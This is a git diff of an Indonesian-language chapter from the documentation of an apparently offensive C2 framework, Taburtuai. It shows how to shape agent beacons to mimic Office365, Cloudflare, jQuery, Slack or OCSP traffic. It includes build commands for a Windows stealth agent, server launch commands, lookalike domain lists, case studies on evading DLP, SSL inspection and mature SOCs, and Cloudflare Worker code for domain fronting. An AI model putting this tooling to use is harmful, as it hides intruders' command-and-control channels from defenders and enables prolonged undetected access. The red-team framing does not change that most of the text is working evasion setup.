@@ -1,6 +1,6 @@
 # 17 — Malleable HTTP Profiles
 
-> Malleable C2 profiles mengubah "tampilan" lalu lintas jaringan antara agent dan server,
+> Malleable C2 profiles mengubah "tampilan" lalu lintas jaringan antara agent dan server
 > sehingga traffic C2 menyerupai aplikasi atau layanan yang sah dan tidak terlihat mencurigakan
 > bagi IDS/IPS, SIEM, maupun analis SOC.
 
@@ -27,7 +27,7 @@ Seorang analis SOC atau IDS rule langsung bisa mendeteksi:
 
 ```
 POST /autodiscover/autodiscover.xml HTTP/1.1
-Host: 185.220.xxx.xxx:443
+Host: mail-gateway.corp-redir.com:443
 User-Agent: Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0.17928; Pro)
 Content-Type: application/json
 X-MS-Exchange-Organization-AuthSource: corp.local
@@ -38,36 +38,37 @@ Analis melihat ini: *"Oh, Outlook lagi sync email ke Exchange. Normal."*
 
 ---
 
-## Konsep Dasar
+## Arsitektur Profile
 
-### Komponen yang Diubah Profile
+### Komponen yang Diubah
 
 | Komponen | Default | Contoh Office365 |
 |---|---|---|
 | Checkin URI | `/api/v1/checkin` | `/autodiscover/autodiscover.xml` |
 | Command poll URI | `/api/v1/command/{id}/next` | `/ews/exchange.asmx/{id}` |
 | Result submit URI | `/api/v1/command/result` | `/mapi/emsmdb` |
-| User-Agent | Chrome generic | Microsoft Outlook 16.0 |
-| HTTP Headers | Content-Type only | X-MS-Exchange-*, Prefer |
+| User-Agent | Chrome 124 generic | Microsoft Outlook 16.0 |
+| HTTP Headers (extra) | — | X-MS-Exchange-*, Prefer |
+| Content-Type | application/json | application/json |
 
-### Cara Kerja
+### Cara Kerja di Server
 
 ```
-[Agent]                          [Server]
-  │                                  │
-  ├─ POST /autodiscover/...  ──────►  ├─ Route alias → AgentCheckin handler
-  │  Header: User-Agent: Outlook     │
-  │  Header: X-MS-Exchange-*         │
-  │                                  │
-  ├─ GET /ews/exchange.asmx/{id} ──► ├─ Route alias → GetNextCommand handler
-  │                                  │
-  ├─ POST /mapi/emsmdb ──────────►   ├─ Route alias → SubmitCommandResult handler
-  │                                  │
-```
+C2 SERVER
+─────────────────────────────────────────────────────────────────
 
-Server mendaftarkan **dua set route**:
-- Set standar `/api/v1/*` — selalu aktif (untuk operator CLI)
-- Set alias sesuai profile — aktif ketika `--profile` diset
+Selalu aktif (untuk operator CLI):
+  POST /api/v1/checkin           → AgentCheckin handler
+  GET  /api/v1/command/:id/next  → GetNextCommand handler
+  POST /api/v1/command/result    → SubmitResult handler
+
+Aktif tambahan saat --profile office365:
+  POST /autodiscover/autodiscover.xml  → AgentCheckin handler
+  GET  /ews/exchange.asmx/:id          → GetNextCommand handler
+  POST /mapi/emsmdb                    → SubmitResult handler
+
+Handler sama — hanya route alias yang berbeda.
+```
 
 ---
 
@@ -82,7 +83,8 @@ di mana network monitoring tidak ketat.
 Checkin URI : /api/v1/checkin
 Command URI : /api/v1/command/{id}/next
 Result URI  : /api/v1/command/result
-User-Agent  : Chrome 124 generic
+User-Agent  : Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0
+Extra Headers: (none)
 ```
 
 **Kapan pakai:** Lab testing, internal engagement, saat speed lebih penting dari stealth.
@@ -99,14 +101,14 @@ Checkin URI : /autodiscover/autodiscover.xml
 Command URI : /ews/exchange.asmx/{id}
 Result URI  : /mapi/emsmdb
 
-Headers:
+Extra Headers:
   X-MS-Exchange-Organization-AuthSource: corp.local
   X-MS-Exchange-Forest-RulesExecuted: true
-  X-AnchorMailbox: SystemMailbox{...}@corp.local
+  X-AnchorMailbox: SystemMailbox{1f05a927-5cdd-4f0f-a8c2}@corp.local
   X-MS-Exchange-Organization-SCL: -1
   Prefer: exchange.behavior.version=2
 
-User-Agents:
+User-Agents (rotasi random per request):
   Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0.17928; Pro)
   Microsoft Office/16.0 (Windows NT 10.0; Microsoft Word 16.0.17928; Pro)
   Autodiscover/1.0 (Microsoft Office/16.0 (Windows NT 10.0))
@@ -117,8 +119,7 @@ User-Agents:
 - Defender memantau outbound HTTP tapi izinkan Exchange traffic
 - Engagement yang memerlukan traffic blend in dengan corporate email
 
-**Keunggulan:** Exchange/Autodiscover adalah traffic yang sangat umum dan
-hampir tidak pernah di-block di environment korporat.
+**Interval realistis:** 300 detik (5 menit) — sama dengan Outlook sync default.
 
 ---
 
@@ -132,23 +133,23 @@ Checkin URI : /cdn-cgi/rum
 Command URI : /cdn-cgi/challenge-platform/h/b/flow/{id}
 Result URI  : /cdn-cgi/zaraz/t
 
-Headers:
+Extra Headers:
   CF-IPCountry: US
   CF-Visitor: {"scheme":"https"}
   X-Forwarded-For: 1.1.1.1
   CDN-Loop: cloudflare
   X-Forwarded-Proto: https
 
-User-Agents: Chrome/Edge browser pool
+User-Agents (rotasi):
+  Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0
+  Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edge/124.0
 ```
 
-**Kapan pakai:**
-- Target menggunakan Cloudflare (atau provider CDN lain)
-- Ingin traffic terlihat seperti CDN telemetry / analytics
-- Environment dengan strict egress filtering yang tetap izinkan CDN
-
 **Catatan:** `/cdn-cgi/rum` adalah endpoint Real User Monitoring Cloudflare yang
-memang sering dipanggil browser secara otomatis.
+memang sering dipanggil browser secara otomatis. Sangat normal di jaringan yang
+site-nya menggunakan Cloudflare.
+
+**Interval realistis:** 120–300 detik.
 
 ---
 
@@ -164,21 +165,15 @@ Result URI  : /assets/js/vendors~main.chunk.js
 
 Content-Type: application/x-www-form-urlencoded
 
-Headers:
+Extra Headers:
   Referer: https://code.jquery.com/
   X-Requested-With: XMLHttpRequest
   Origin: https://code.jquery.com
 
-User-Agents: Chrome, Firefox, Safari pool
+User-Agents: Chrome, Firefox, Safari (rotasi)
 ```
 
-**Kapan pakai:**
-- Environment web development / hosting
-- Target memiliki banyak traffic ke CDN JavaScript
-- Ingin traffic terlihat seperti web app yang loading scripts
-
-**Keunggulan:** File `.min.js` tidak pernah dicurigai karena browser selalu
-meminta banyak file JS dari berbagai CDN.
+**Interval realistis:** 60–120 detik.
 
 ---
 
@@ -192,21 +187,18 @@ Checkin URI : /api/users.identity
 Command URI : /api/conversations.history/{id}
 Result URI  : /api/chat.postMessage
 
-Headers:
-  Authorization: Bearer xoxb-placeholder-token
+Extra Headers:
+  Authorization: Bearer xoxb-placeholder-token-for-profile
   X-Slack-Retry-Num: 0
   X-Slack-No-Retry: 1
-  X-Slack-Request-Timestamp: 1714924512
+  X-Slack-Request-Timestamp: <unix timestamp>
 
 User-Agents:
   Slack SSB/4.35.126 (Win32 NT 10.0.22621; x64)
   Slack/4.35.126 (Windows 10; 64-bit; +https://slack.com)
 ```
 
-**Kapan pakai:**
-- Target menggunakan Slack sebagai alat komunikasi
-- Environment yang aggressively monitor traffic tapi whitelist Slack
-- Engagement di perusahaan tech/startup yang sangat bergantung Slack
+**Interval realistis:** 30–60 detik — Slack polling interval normal.
 
 ---
 
@@ -223,7 +215,7 @@ Result URI  : /crl/root.crl
 
 Content-Type: application/ocsp-request
 
-Headers:
+Extra Headers:
   Cache-Control: no-cache
   Pragma: no-cache
 
@@ -238,9 +230,10 @@ User-Agents:
 - Environment dengan deep packet inspection
 - Ingin traffic yang benar-benar blend in dengan OS behavior
 
-**Keunggulan:** `Microsoft-CryptoAPI` adalah user-agent yang dibuat Windows sendiri
-saat melakukan certificate validation. TIDAK ADA yang mencurigai Windows mengecek
-sertifikat TLS — ini adalah perilaku OS yang sangat normal.
+`Microsoft-CryptoAPI` adalah user-agent yang dibuat Windows sendiri saat melakukan
+certificate validation — tidak ada yang mencurigai Windows mengecek sertifikat TLS.
+
+**Interval realistis:** 1800–3600 detik — OCSP check tidak perlu sering.
 
 ---
 
@@ -251,327 +244,353 @@ sertifikat TLS — ini adalah perilaku OS yang sangat normal.
 ```bash
 # Office365 profile
 make agent-win-stealth \
-  C2_SERVER=https://c2.yourdomain.com \
-  ENC_KEY=C0rp3ngag3m3nt2026 \
+  C2_SERVER=https://mail-gateway.corp-redir.com \
+  ENC_KEY=EnterpriseC2Key2026 \
   PROFILE=office365 \
-  INTERVAL=60 \
-  JITTER=30 \
+  INTERVAL=300 \
+  JITTER=20 \
   KILL_DATE=2026-06-30
+```
 
+**Output:**
+```
+[*] Building Windows stealth agent...
+    C2_SERVER : https://mail-gateway.corp-redir.com
+    ENC_KEY   : EnterpriseC2Key2026
+    PROFILE   : office365
+    INTERVAL  : 300s  JITTER: 20%
+    KILL_DATE : 2026-06-30
+[+] Binary written: bin/agent_windows_stealth.exe (8.4 MB)
+
+[i] Profile: office365
+    Checkin → POST /autodiscover/autodiscover.xml
+    Poll    → GET  /ews/exchange.asmx/{id}
+    Result  → POST /mapi/emsmdb
+    UA pool : Outlook/Word/Autodiscover (rotasi random)
+```
+
+```bash
 # CDN profile
 make agent-win-stealth \
-  C2_SERVER=https://c2.yourdomain.com \
-  ENC_KEY=C0rp3ngag3m3nt2026 \
-  PROFILE=cdn
-
-# OCSP — paling stealth
-make agent-win-stealth \
-  C2_SERVER=https://c2.yourdomain.com \
-  ENC_KEY=C0rp3ngag3m3nt2026 \
-  PROFILE=ocsp \
-  INTERVAL=120 \
+  C2_SERVER=https://cdn-assets.legit-cdn.com \
+  ENC_KEY=EnterpriseC2Key2026 \
+  PROFILE=cdn \
+  INTERVAL=180 \
   JITTER=40
 ```
 
+**Output:**
+```
+[*] Building Windows stealth agent...
+    PROFILE   : cdn
+    INTERVAL  : 180s  JITTER: 40%  (range: 108s–252s)
+[+] Binary written: bin/agent_windows_stealth.exe (8.4 MB)
+
+[i] Profile: cdn
+    Checkin → POST /cdn-cgi/rum
+    Poll    → GET  /cdn-cgi/challenge-platform/h/b/flow/{id}
+    Result  → POST /cdn-cgi/zaraz/t
+    Headers : CF-IPCountry, CF-Visitor, CDN-Loop
+```
+
+```bash
+# OCSP — paling stealth
+make agent-win-stealth \
+  C2_SERVER=https://ocsp.trusted-root-ca.com \
+  ENC_KEY=APTSim2026Key \
+  PROFILE=ocsp \
+  INTERVAL=3600 \
+  JITTER=60 \
+  KILL_DATE=2026-12-31
+```
+
+**Output:**
+```
+[*] Building Windows stealth agent...
+    PROFILE   : ocsp
+    INTERVAL  : 3600s  JITTER: 60%  (range: 1440s–5760s)
+[+] Binary written: bin/agent_windows_stealth.exe (8.4 MB)
+
+[i] Profile: ocsp
+    Checkin → POST /ocsp
+    Poll    → GET  /ocsp/{id}
+    Result  → POST /crl/root.crl
+    UA pool : Microsoft-CryptoAPI/10.0, Microsoft-WinHTTP/5.1
+[i] NOTE: Interval sangat panjang (1-96 menit) — cocok untuk APT simulation.
+```
+
 **PENTING:** Profile yang di-build ke agent **harus sama** dengan profile yang
-dijalankan di server. Kalau mismatch, agent tidak akan bisa connect.
+dijalankan di server. Mismatch = agent tidak bisa connect.
 
 ---
 
 ### Step 2 — Jalankan Server dengan Profile yang Sama
 
 ```bash
-# Harus pakai profile yang sama dengan agent
-ENCRYPTION_KEY=C0rp3ngag3m3nt2026 ./bin/server \
+# Server harus pakai profile yang sama dengan agent
+ENCRYPTION_KEY=EnterpriseC2Key2026 ./bin/server \
   --port 443 \
   --profile office365
-
-# Output startup:
-#   addr     0.0.0.0:443
-#   auth     false
-#   profile  office365
-#   logs     ./logs
-#   db       ./data/taburtuai.db
 ```
 
-Server akan otomatis mendaftarkan route alias:
+**Output startup:**
 ```
-POST /autodiscover/autodiscover.xml  → checkin
-GET  /ews/exchange.asmx/:id          → command poll
-POST /mapi/emsmdb                    → result submit
+[*] Taburtuai C2 Server starting...
+
+    addr     0.0.0.0:443
+    auth     false
+    profile  office365
+    logs     ./logs
+    db       ./data/taburtuai.db
+
+[*] Profile: office365 — registering route aliases...
+    POST /autodiscover/autodiscover.xml  → agent checkin
+    GET  /ews/exchange.asmx/:id          → command poll
+    POST /mapi/emsmdb                    → result submit
+
+[+] Server ready. Listening on :443
+```
+
+```bash
+# Server dengan CDN profile
+ENCRYPTION_KEY=EnterpriseC2Key2026 ./bin/server --port 443 --profile cdn
+```
+
+**Output:**
+```
+[*] Profile: cdn — registering route aliases...
+    POST /cdn-cgi/rum                              → agent checkin
+    GET  /cdn-cgi/challenge-platform/h/b/flow/:id → command poll
+    POST /cdn-cgi/zaraz/t                          → result submit
+
+[+] Server ready. Listening on :443
 ```
 
 ---
 
 ### Step 3 — Verifikasi Traffic
 
-Dari operator, jalankan agent dan lihat agent checkin masuk:
+Setelah agent berjalan di target dan melakukan checkin:
 
 ```
-taburtuai(c2.yourdomain.com:443) › agents list
+taburtuai(mail-gateway.corp-redir.com:443) › agents list
+```
+
+```
 [+] 1 agent(s) registered:
 
-ID        HOSTNAME          USER         OS        STATUS
-2703886d  CORP-LAPTOP-JD01  CORP\john    Windows   online
-
-taburtuai › agents info 2703886d
-# Semua informasi agent muncul normal
-# Di sisi server, log mencatat checkin via alias URI
+ID        HOSTNAME          USER           OS       STATUS   LAST SEEN
+2703886d  CORP-LAPTOP-JD01  CORP\john.doe  Windows  online   3s ago
 ```
 
-Di Wireshark atau network monitor target, traffic terlihat:
+**Di log server** (bukan output console, tapi di `./logs/`):
+```
+2026-04-23T09:15:03Z  POST  /autodiscover/autodiscover.xml  200  [agent=2703886d]
+2026-04-23T09:20:07Z  GET   /ews/exchange.asmx/2703886d     200  [no-cmd]
+2026-04-23T09:25:09Z  GET   /ews/exchange.asmx/2703886d     200  [cmd=whoami]
+2026-04-23T09:25:12Z  POST  /mapi/emsmdb                    200  [result=2703886d]
+```
+
+**Di Wireshark atau network capture target:**
 ```
 POST /autodiscover/autodiscover.xml HTTP/1.1
-Host: c2.yourdomain.com
-User-Agent: Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook ...)
+Host: mail-gateway.corp-redir.com
+User-Agent: Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0.17928; Pro)
+Content-Type: application/json
+X-MS-Exchange-Organization-AuthSource: corp.local
+X-AnchorMailbox: SystemMailbox{1f05a927}@corp.local
+Content-Length: 248
 ```
+
+Analis SOC atau IDS melihat: "Outlook melakukan Exchange sync." ✓
 
 ---
 
 ### Referensi Cepat — Pasangan Profile
 
-| PROFILE agent | Flag server | URI yang dipakai |
-|---|---|---|
-| `default` | `--profile default` (atau tanpa flag) | `/api/v1/*` |
-| `office365` | `--profile office365` | `/autodiscover/...`, `/ews/...`, `/mapi/...` |
-| `cdn` | `--profile cdn` | `/cdn-cgi/*` |
-| `jquery` | `--profile jquery` | `/assets/js/*.min.js` |
-| `slack` | `--profile slack` | `/api/users.identity`, `/api/conversations.*` |
-| `ocsp` | `--profile ocsp` | `/ocsp`, `/crl/root.crl` |
+| PROFILE agent | Flag server | URI yang dipakai | Interval tipikal |
+|---|---|---|---|
+| `default` | `--profile default` (atau tanpa flag) | `/api/v1/*` | 30–60s |
+| `office365` | `--profile office365` | `/autodiscover/...`, `/ews/...`, `/mapi/...` | 300s |
+| `cdn` | `--profile cdn` | `/cdn-cgi/*` | 120–300s |
+| `jquery` | `--profile jquery` | `/assets/js/*.min.js` | 60–120s |
+| `slack` | `--profile slack` | `/api/users.identity`, `/api/conversations.*` | 30–60s |
+| `ocsp` | `--profile ocsp` | `/ocsp`, `/crl/root.crl` | 1800–3600s |
+
+---
+
+## Domain Name Matters
+
+Nama domain C2 harus konsisten dengan profile yang dipilih:
+
+```
+Profile         Contoh Domain yang Cocok
+─────────────────────────────────────────────────────────────────
+office365    →  mail-gateway.corp-redir.com
+                autodiscover.company-o365.net
+                exchange-relay.enterprise-mail.com
+
+cdn          →  assets.cdn-delivery-network.com
+                static.cloudflare-content.net
+                edge-cache.content-accelerator.com
+
+jquery       →  cdn.jquery-static-assets.com
+                assets.js-delivery.net
+                static.web-resources-cdn.com
+
+slack        →  api.slack-workspace.net
+                hooks.slack-integration.com
+                edge.slack-api-relay.com
+
+ocsp         →  ocsp.trusted-root-ca.com
+                crl.certificate-authority.net
+                ocsp.digicert-revocation.com
+```
+
+Domain yang mengandung kata kunci relevan (mail, exchange, cdn, ocsp, static)
+membuat traffic lebih believable di log firewall dan proxy.
 
 ---
 
 ## Studi Kasus
 
-### Studi Kasus 1: Bypass DLP / HTTPS Inspection di Perusahaan Retail
+### Studi Kasus 1: Bypass DLP / HTTPS Inspection — Retail Enterprise
 
 **Situasi:**
+- Target: perusahaan retail besar dengan SSL inspection (MITM proxy)
+- SIEM alert untuk koneksi ke IP asing yang tidak dikenal
+- Beacon pattern regular (setiap 60 detik) akan terdeteksi
 
-Target adalah perusahaan retail besar. Network team mereka menjalankan SSL inspection
-(MITM proxy) untuk semua traffic kecuali whitelist tertentu. Mereka juga punya SIEM
-yang alert kalau ada koneksi ke IP asing yang tidak dikenal.
-
-**Masalah:**
-- Kalau pakai default profile: `POST /api/v1/checkin` langsung di-block dan di-alert
-- IP C2 asing tidak masuk whitelist
-- Beacon pattern (request setiap 60 detik) akan terdeteksi
-
-**Solusi — Profile `cdn` + Domain Fronting:**
+**Setup — Profile `cdn` + Domain Fronting:**
 
 ```bash
-# 1. Setup C2 di belakang Cloudflare (domain fronting)
-#    Domain: legit-looking.com → Cloudflare → C2 VPS
-#    Agent connect ke Cloudflare, bukan langsung ke VPS
-
-# 2. Build agent CDN profile
+# Build agent CDN profile — di belakang Cloudflare
 make agent-win-stealth \
   C2_SERVER=https://legit-looking.com \
   ENC_KEY=R3t41l3ng2026! \
   PROFILE=cdn \
-  INTERVAL=180 \          # 3 menit — lebih natural untuk CDN analytics
-  JITTER=50               # 50% jitter = antara 90-270 detik
+  INTERVAL=180 \
+  JITTER=50
+```
 
-# 3. Jalankan server dengan profile cdn
+```
+[*] Building Windows stealth agent...
+    PROFILE   : cdn
+    INTERVAL  : 180s  JITTER: 50%  (range: 90s–270s)
+[+] Binary written: bin/agent_windows_stealth.exe (8.4 MB)
+```
+
+```bash
+# Jalankan server
 ENCRYPTION_KEY=R3t41l3ng2026! ./bin/server --port 443 --profile cdn
 ```
 
 **Hasilnya:**
-- Traffic ke Cloudflare IP — sudah pasti di whitelist (Cloudflare dipakai jutaan situs)
-- Header CF-* membuat traffic terlihat seperti CDN telemetry — sangat normal
-- Interval 3 menit dengan jitter tinggi — tidak ada beacon pattern yang jelas
-- SSL inspection bypass karena traffic ke Cloudflare yang trusted
+- Traffic ke Cloudflare IP — sudah pasti di whitelist
+- Header CF-* membuat traffic terlihat seperti CDN telemetry
+- Interval 3 menit dengan jitter 50% — tidak ada beacon pattern yang jelas
+- Range waktu: 90–270 detik (sangat tidak predictable)
 
 ---
 
-### Studi Kasus 2: Persistent Access di Environment Korporat dengan O365
+### Studi Kasus 2: Corporate Finance — Office365 Profile
 
 **Situasi:**
-
-Engagement red team di perusahaan finance yang semua komunikasi pakai Microsoft 365.
-SOC mereka memantau semua traffic keluar dan punya alert untuk "unusual outbound HTTP".
-Exchange/Outlook traffic sudah pasti di-whitelist.
+- Target: perusahaan finance dengan Microsoft 365
+- SOC memantau semua traffic keluar, alert untuk "unusual outbound HTTP"
+- Exchange/Outlook traffic sudah pasti di-whitelist
 
 **Setup:**
 
 ```bash
-# 1. Build agent dengan profile office365 dan kill date sesuai engagement
 make agent-win-stealth \
   C2_SERVER=https://mail-gateway.corpname-redir.com \
   ENC_KEY=F1n4nc3R3dt3am! \
   PROFILE=office365 \
-  INTERVAL=300 \          # 5 menit — seperti Outlook sync interval default
+  INTERVAL=300 \
   JITTER=20 \
   KILL_DATE=2026-07-31
-
-# 2. Server dengan profile office365
-ENCRYPTION_KEY=F1n4nc3R3dt3am! ./bin/server --port 443 --profile office365
-
-# 3. Hasil traffic dari target:
-#    POST /autodiscover/autodiscover.xml  ← terlihat seperti Outlook sync
-#    GET  /ews/exchange.asmx/<agent_id>   ← terlihat seperti EWS polling
-#    POST /mapi/emsmdb                    ← terlihat seperti MAPI request
 ```
 
-**Di SIEM target:**
 ```
-[INFO] Outbound HTTPS to mail-gateway.corpname-redir.com:443
-       User-Agent: Microsoft Office/16.0 (Outlook)
-       Pattern: Periodic sync every ~5min
-       Status: NORMAL — Exchange sync traffic
+[i] Profile: office365
+    Interval : 300s ± 20%  (range: 240s–360s)
+    UA pool  : Outlook/Word/Autodiscover
+[+] Binary written: bin/agent_windows_stealth.exe (8.4 MB)
 ```
 
-Analis SOC melihat ini sebagai traffic Outlook biasa. ✓
-
-**Kenapa nama domain `mail-gateway.corpname-redir.com`?**
-Domain yang mengandung kata seperti "mail", "gateway", "corp" terlihat lebih
-legitimate sebagai tujuan Exchange traffic.
+**Di SIEM target (yang terlihat analis):**
+```
+[INFO] Outbound HTTPS: mail-gateway.corpname-redir.com:443
+       User-Agent   : Microsoft Office/16.0 (Outlook)
+       Frequency    : Periodic sync every ~5 min
+       Classification: NORMAL — Exchange traffic
+       Action       : Allow
+```
 
 ---
 
-### Studi Kasus 3: Long-Term Covert Access — OCSP Profile
+### Studi Kasus 3: APT Simulation — OCSP Profile (Long Haul)
 
 **Situasi:**
+- Engagement APT simulation, 6+ bulan, target dengan SOC mature
+- EDR, network monitoring, behavioral analysis, anomaly detection
 
-Engagement APT simulation. Klien minta simulasi threat actor yang bisa bertahan
-lama (6+ bulan) tanpa terdeteksi. SOC mereka sangat mature: EDR, network monitoring,
-behavioral analysis, dan anomaly detection.
-
-**Strategi:**
-
-Gunakan `ocsp` profile dengan interval panjang dan jitter sangat tinggi untuk
-menyerupai perilaku validasi sertifikat yang dilakukan Windows secara organik.
+**Setup:**
 
 ```bash
-# 1. Build agent dengan ocsp profile
 make agent-win-stealth \
-  C2_SERVER=https://ocsp.trusted-ca-revoke.com \
+  C2_SERVER=https://ocsp.trusted-root-ca.com \
   ENC_KEY=APTs1mul4t10n2026 \
   PROFILE=ocsp \
-  INTERVAL=3600 \       # 1 jam — OCSP check tidak perlu sering
-  JITTER=60 \           # 60% jitter = antara 24 menit s/d 1 jam 36 menit
+  INTERVAL=3600 \
+  JITTER=60 \
   KILL_DATE=2026-12-31
-
-# 2. Server
-ENCRYPTION_KEY=APTs1mul4t10n2026 ./bin/server --port 443 --profile ocsp
-
-# 3. Traffic yang terlihat di target:
-#    POST /ocsp  HTTP/1.1
-#    Host: ocsp.trusted-ca-revoke.com
-#    User-Agent: Microsoft-CryptoAPI/10.0
-#    Content-Type: application/ocsp-request
-#    Cache-Control: no-cache
 ```
 
-**Di network log target:**
 ```
-[2026-05-15 09:23:41] HTTPS POST ocsp.trusted-ca-revoke.com/ocsp
+[i] Profile: ocsp
+    Interval : 3600s ± 60%  (range: 1440s–5760s = 24min–96min)
+    UA pool  : Microsoft-CryptoAPI/10.0
+[+] Binary written: bin/agent_windows_stealth.exe (8.4 MB)
+```
+
+**Di network log target (yang terlihat analis):**
+```
+[2026-05-15 09:23:41] HTTPS POST ocsp.trusted-root-ca.com/ocsp
                        UA: Microsoft-CryptoAPI/10.0 — Certificate validation
-[2026-05-15 11:07:18] HTTPS POST ocsp.trusted-ca-revoke.com/ocsp
+[2026-05-15 11:07:18] HTTPS POST ocsp.trusted-root-ca.com/ocsp
                        UA: Microsoft-CryptoAPI/10.0 — Certificate validation
 ```
 
-Analis melihat dua OCSP request dengan selisih ~1 jam 40 menit. Ini **sangat normal** —
-Windows melakukan OCSP check saat TLS handshake terjadi, dan dengan jitter tinggi,
-tidak ada pola yang jelas.
-
-**Catatan penting untuk domain OCSP:**
-Pilih nama domain yang terlihat seperti CA (Certificate Authority) root:
-- `ocsp.trusted-ca-revoke.com`
-- `crl.microsoft-certificate.net`
-- `validation.digicert-ocsp.com`
-Domain seperti ini sangat jarang di-block karena terlihat seperti infrastructure PKI.
-
----
-
-## Tips Operasional
-
-### Pilih Profile Berdasarkan Target Environment
-
-```
-Target pakai Office 365?  → office365
-Target di-protect Cloudflare? → cdn
-Target environment developer/startup? → jquery atau slack
-Target dengan SOC mature + behavioral analysis? → ocsp
-Lab/internal testing? → default
-```
-
-### Jangan Lupa Sesuaikan Interval
-
-Setiap profile punya "natural interval" yang terlihat realistis:
-
-| Profile | Interval Realistis | Alasan |
-|---|---|---|
-| `office365` | 300s (5 menit) | Outlook sync interval default |
-| `cdn` | 120-300s | CDN analytics tidak terlalu frequent |
-| `jquery` | 60-120s | Lazy loading JavaScript normal |
-| `slack` | 30-60s | Slack WebSocket check interval |
-| `ocsp` | 1800-3600s | OCSP check tidak perlu sering |
-
-### Domain Name Matters
-
-Nama domain C2 harus konsisten dengan profile yang dipilih:
-
-```
-office365 → mail.corp-exchange-gateway.com
-            autodiscover.company-o365.net
-
-cdn       → assets.cdn-delivery-network.com
-            static.cloudflare-content.net
-
-jquery    → cdn.jquery-static-assets.com
-            assets.js-delivery.net
-
-slack     → api.slack-workspace.net
-            hooks.slack-integration.com
-
-ocsp      → ocsp.trusted-root-ca.com
-            crl.certificate-authority.net
-```
+Dua OCSP request dengan selisih ~1 jam 40 menit — sangat normal, tidak ada pola
+mencurigakan. Windows memang melakukan OCSP check secara organik.
 
 ---
 
 ## Domain Fronting
 
-Domain fronting adalah teknik lanjutan yang **digabungkan** dengan malleable profiles
-untuk menyembunyikan identitas server C2 yang sebenarnya. Ini adalah lapisan kedua
-setelah profile mengubah tampilan traffic.
+Domain fronting adalah teknik lanjutan yang digabungkan dengan malleable profiles
+untuk menyembunyikan identitas server C2 yang sebenarnya.
 
 ### Konsep
 
+```
 Tanpa domain fronting:
-```
-[Agent]  ──HTTPS──►  [IP C2: 185.220.xxx.xxx:443]
+  [Agent] ──HTTPS──► [IP C2: 185.220.xxx.xxx:443]
                        TLS SNI: c2.yourdomain.com
-                       Host:    c2.yourdomain.com
-                       ↑ Firewall bisa block IP ini
+                       ↑ Firewall bisa block IP dan domain ini
+
+Dengan domain fronting via Cloudflare:
+  [Agent] ──HTTPS──► [Cloudflare CDN: 104.21.xxx.xxx]
+                       TLS SNI: taburtuai-worker.workers.dev   ← terlihat di network
+                       HTTP Host: c2.yourdomain.com            ← di dalam TLS, tidak terlihat
+                       Cloudflare forward ke backend C2
+                       ↑ Firewall hanya lihat koneksi ke Cloudflare (trusted)
 ```
 
-Dengan domain fronting:
-```
-[Agent]  ──HTTPS──►  [CDN: Cloudflare/AWS CloudFront]
-                       TLS SNI: cdn-worker.workers.dev   ← yang terlihat di network
-                       Host:    c2.yourdomain.com         ← dikirim di dalam HTTPS
-                       CDN meneruskan ke backend berdasarkan Host header
-                       ↑ Firewall hanya melihat koneksi ke CDN yang trusted
-```
+### Build Agent dengan Domain Fronting
 
-Firewall atau IDS hanya bisa melihat:
-- IP tujuan: IP Cloudflare/AWS (terpercaya, tidak bisa di-block tanpa breaking internet)
-- TLS SNI: domain CDN (terlihat legitimate)
-
-Isi HTTP request (termasuk Host header) ada di dalam TLS tunnel — **tidak terlihat**
-tanpa SSL inspection, dan bahkan kalau ada SSL inspection, CDN trusted cert tidak
-akan di-intercept.
-
-### Setup Domain Fronting
-
-**Prasyarat:**
-- Domain C2 (`c2.yourdomain.com`) sudah di-proxy oleh CDN (Cloudflare, AWS CloudFront, Fastly)
-- CDN dikonfigurasi untuk forward request ke C2 server berdasarkan Host header
-- `C2_SERVER` = URL ke CDN endpoint (bukan IP C2 langsung)
-- `FRONT_DOMAIN` = domain C2 asli (yang CDN gunakan untuk routing)
-
-**Build agent:**
 ```bash
 # Tanpa domain fronting (koneksi langsung ke C2)
 make agent-win-stealth \
@@ -587,40 +606,26 @@ make agent-win-stealth \
   FRONT_DOMAIN=c2.yourdomain.com
 ```
 
-**Apa yang terjadi saat agent connect:**
 ```
-# Agent melakukan koneksi TCP+TLS ke:
-  taburtuai-worker.mjopsec.workers.dev  ← IP Cloudflare
+[*] Building Windows stealth agent...
+    C2_SERVER    : https://taburtuai-worker.mjopsec.workers.dev
+    FRONT_DOMAIN : c2.yourdomain.com  (domain fronting active)
+    PROFILE      : office365
+[+] Binary written: bin/agent_windows_stealth.exe (8.4 MB)
 
-# Setelah TLS tunnel terbentuk, HTTP request yang dikirim:
-  POST /autodiscover/autodiscover.xml HTTP/1.1
-  Host: c2.yourdomain.com               ← override lewat FRONT_DOMAIN
-  User-Agent: Microsoft Office/16.0 ...
-  Content-Type: application/json
-
-# Cloudflare membaca Host header → forward ke c2.yourdomain.com
-# C2 server menerima request normal dan merespons
+[i] Domain fronting enabled:
+    Connection TLS to : taburtuai-worker.mjopsec.workers.dev (Cloudflare IP)
+    HTTP Host header  : c2.yourdomain.com (inside TLS tunnel)
 ```
 
-**Di network monitor target:**
-```
-# Yang terlihat:
-Destination IP : 104.21.xxx.xxx (Cloudflare IP — trusted)
-TLS SNI        : taburtuai-worker.mjopsec.workers.dev
-                 ↑ bukan IP C2, bukan domain C2
-```
-
-### Contoh Setup Cloudflare Worker (CDN Front)
-
-Buat Cloudflare Worker sebagai reverse proxy ke C2:
+### Cloudflare Worker Setup
 
 ```javascript
-// worker.js — deploy ke Cloudflare Workers
+// worker.js — deploy ke Cloudflare Workers sebagai reverse proxy
 export default {
   async fetch(request) {
     const url = new URL(request.url);
-    // Ganti hostname ke C2 backend yang sebenarnya
-    url.hostname = "c2.yourdomain.com";
+    url.hostname = "c2.yourdomain.com";  // ganti ke C2 backend
 
     const modifiedRequest = new Request(url.toString(), {
       method: request.method,
@@ -633,43 +638,55 @@ export default {
 };
 ```
 
-Deploy:
 ```bash
+# Deploy worker
 wrangler deploy worker.js --name taburtuai-worker
-# URL: https://taburtuai-worker.mjopsec.workers.dev
 ```
 
-Gunakan URL worker sebagai `C2_SERVER` dan domain C2 asli sebagai `FRONT_DOMAIN`.
+```
+✅  Successfully published your Worker
+    https://taburtuai-worker.mjopsec.workers.dev
+```
 
